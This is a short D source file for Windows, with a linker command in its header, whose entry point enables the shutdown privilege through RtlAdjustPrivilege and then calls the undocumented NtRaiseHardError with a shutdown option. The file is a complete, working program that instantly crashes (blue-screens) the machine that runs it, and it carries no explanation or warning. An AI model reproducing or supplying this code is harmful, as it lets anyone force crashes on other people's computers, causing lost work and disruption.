/*
 * Compile with:
 * ldc2 fuck -L="/ENTRY:_s" -L="/SUBSYSTEM:CONSOLE" -L="/DEBUG:NONE" -L="/ALIGN:16" -L="/DRIVER" -L="/STACK:0x100,0x100" -L="/HEAP:0x100" -L="/MACHINE:X86" -betterC -m32
 */

pragma(startaddress, _s);
pragma(lib, "kernel32.lib");

alias void* HANDLE; alias void* HMODULE; alias void* FARPROC;
enum NULL = cast(void*)0;

extern (Windows) HANDLE LoadLibraryA(immutable(char)*);
extern (Windows) FARPROC GetProcAddress(HANDLE, immutable(char)*);

extern(C) void _s() {
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		asm { // __stdcall, 32-bit
			push 0; // EBX
			push 0;
			push 1;
			push 19;
			call RtlAdjustPrivilege;
			push 0; // EBX
			push 6;
			push 0;
			push 0;
			push 0;
			push 0xdead_fdab;
			call NtRaiseHardError;
		}
  	}
}